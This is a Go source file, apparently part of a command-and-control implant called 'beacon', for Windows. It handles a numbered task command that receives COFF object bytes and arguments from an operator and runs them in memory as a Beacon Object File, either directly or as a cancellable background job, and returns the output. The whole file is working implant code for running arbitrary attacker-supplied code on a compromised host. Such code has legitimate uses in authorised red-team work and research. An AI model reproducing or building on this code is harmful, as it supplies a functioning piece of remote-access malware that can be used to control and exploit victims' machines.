//go:build windows && amd64

package command

import (
	"beacon/pkg/bof/coff"
	"beacon/pkg/jobs"
	"beacon/pkg/utils/encoding"
	"beacon/pkg/utils/packet"
	"fmt"

	"golang.org/x/sys/windows"
)

// BOFCommand 处理 command 70 的 BOF/COFF 执行请求。
type BOFCommand struct{}

func (c *BOFCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	coffBytes := p.ParseBytes()
	argBytes := p.ParseBytes()
	if p.HasError() {
		return nil, p.Error()
	}

	output, err := coff.Load(coffBytes, argBytes)
	if err != nil {
		return nil, err
	}

	return [][]byte{[]byte(encoding.ConvertCpToUTF8(output, acp))}, nil
}

func StartBOFJob(manager *jobs.Manager, sink func([]byte), taskID uint32, commandID uint32, p *packet.Parser, acp int) ([]byte, error) {
	coffBytes := p.ParseBytes()
	var argBytes []byte
	if !p.HasError() && p.Size() > 0 {
		argBytes = p.ParseBytes()
	}
	if p.HasError() {
		return nil, p.Error()
	}
	if p.Size() != 0 {
		return nil, fmt.Errorf("bof payload has trailing bytes")
	}
	if len(coffBytes) == 0 {
		return nil, fmt.Errorf("bof requires COFF bytes")
	}
	if manager == nil {
		return nil, fmt.Errorf("job manager is not initialized")
	}

	coffCopy := append([]byte(nil), coffBytes...)
	argCopy := append([]byte(nil), argBytes...)
	stopEvent, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return nil, fmt.Errorf("CreateEvent failed: %w", err)
	}

	job, err := manager.Create(taskID, commandID, jobs.TypeBOF, "bof")
	if err != nil {
		_ = windows.CloseHandle(stopEvent)
		return nil, err
	}
	job.Detail = fmt.Sprintf("%d bytes", len(coffCopy))
	job.SetCancelHook(func() {
		_ = windows.SetEvent(stopEvent)
	})

	manager.Start(job, func(job *jobs.Job) {
		defer windows.CloseHandle(stopEvent)
		if job.Context().Err() != nil {
			emitBOFOutput(sink, taskID, commandID, []byte(fmt.Sprintf("BOF job %d canceled before start", taskID)))
			return
		}

		err := coff.LoadWithMethodOutputStopEvent(coffCopy, argCopy, "go", uintptr(stopEvent), func(output string) {
			text := encoding.ConvertCpToUTF8(output, acp)
			emitBOFOutput(sink, taskID, commandID, []byte(text))
		})
		if err != nil && job.Context().Err() == nil {
			emitBOFOutput(sink, taskID, commandID, []byte(fmt.Sprintf("BOF: execution failed: %v", err)))
		}
	})

	return packet.PackArray([]any{[]byte(fmt.Sprintf("BOF job %d started", taskID))})
}
